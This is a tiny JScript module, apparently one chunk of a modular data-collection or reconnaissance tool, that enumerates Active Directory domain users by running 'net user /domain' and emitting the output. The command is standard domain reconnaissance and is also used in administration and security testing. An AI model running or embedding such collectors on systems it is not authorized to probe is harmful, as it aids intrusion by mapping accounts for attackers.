// chunk: ad_collectors/ad_users
// depends: core/emit_buffer, core/run_cmd
// provides: collect_ad_users
// format: jscript

function collect_ad_users() {
    emit("\r\n=== AD USERS ===\r\n");
    emit(_run("net user /domain"));
}
